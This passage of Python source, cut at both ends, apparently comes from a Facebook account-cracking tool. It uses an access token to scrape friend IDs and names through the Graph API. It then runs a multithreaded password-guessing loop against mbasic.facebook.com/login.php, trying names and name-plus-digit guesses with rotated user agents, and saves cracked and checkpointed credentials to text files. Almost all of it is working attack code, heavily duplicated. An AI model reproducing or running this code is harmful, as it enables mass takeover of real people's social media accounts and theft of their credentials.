    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    os.system('rm -rf newlinks.txt')
    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
    os.system('rm -rf kk.txt')
    os.system('rm -rf jok.txt')
    os.system('clear')
    print (logo)
    print ("")
    try:
        for line in open("newlinks.txt",'r').readlines():
            idx.append(line.strip())
    except:
        fb_menu()
    print ("[!] total ids : "+str(len(idx)))
    os.system('echo " -----------------------------------"| lolcat')
    print ("    cracking start please wait ..   ")
    os.system('echo " -----------------------------------"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        myagents=random.choice(["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8", "Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12"])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass1)
                ok=open('RK-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass1)
                    cp=open('RK-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = ps1
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass2)
                        ok=open('RK-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass2)
                            cp=open('RK-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = ps2
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass3)
                                ok=open('RK-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass3)
                                    cp=open('RK-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = ps3
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass4)
                                        ok=open('RK-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass4)
                                            cp=open('RK-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = ps4
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass5)
                                                ok=open('RK-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass5)
                                                    cp=open('RK-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print ("\x1b[1;97m")
    print (39*'-')
    print ("[!] cloning complete result ........")
    print (39*'-')
    print ('[!] Total Ok Ids : '+str(len(oks)))
    print ('[!] Total Cp Ids : '+str(len(cps)))
    print (39*'-')
    print ('')
    input(' Press Enter To Back ')
    fb_menu()






def xoknp():
    os.system("rm -rf kk.txt")
    hok=('jok.txt')
    count=[]
    rana=[]
    try:
        token=open('token.txt','r').read()
    except:
        fb_menu()
    os.system('clear')
    print (logo)
    print ("")
    iiid=int(input("[1] Enter ID : "))
    print ("")
    ps1=int(input('[1] name + digit : '))
    ps2=int(input('[2] name + digit : '))
    ps3=int(input('[3] name + digit : '))
    ps4=int(input('[4] last + name  : '))
    print ("")
    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
    q=json.loads(rrp.text)
    nid=q ['name']
    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("look.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    print ("")
    print (sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends")
    print ("")
    time.sleep(2)
    print (g+"[=] Transfer Complte Process Start *"+w)
    print ("")
    os.system(' cat look.txt | grep "10000" >> kk.txt')
    os.system(' cat look.txt | grep "1000" >> kk.txt')
    os.system('rm -rf look.txt')
    file=open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    my_line = file.readline()
    count.append(my_line)
    print (g+"[=] We are graping links for ok ids : "+my_line[:15])
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    os.system('rm -rf newlinks.txt')
    os.system('cat jok.txt | grep '+l1+' >> newlinks.txt')
    os.system('cat jok.txt | grep '+l2+' >> newlinks.txt')
    os.system('rm -rf kk.txt')
    os.system('rm -rf jok.txt')
    os.system('clear')
    print (logo)
    print ("")
    try:
        for line in open("newlinks.txt",'r').readlines():
            idx.append(line.strip())
    except:
        fb_menu()
    print ("[!] total ids : "+str(len(idx)))
    os.system('echo " -----------------------------------"| lolcat')
    print ("    cracking start please wait ..   ")
    os.system('echo " -----------------------------------"| lolcat')
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        myagents=random.choice(["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8", "Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12"])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass1)
                ok=open('RK-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass1)
                    cp=open('RK-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+ps1
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': myagents, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print ("\x1b[1;92m[RK-OK] "+uid + " | " + pass2)
                        ok=open('RK-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print ("\x1b[1;97m[RK-CP] "+uid + " | " + pass2)
                            cp=open('RK-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+ps2
                            rana = requests.Session()
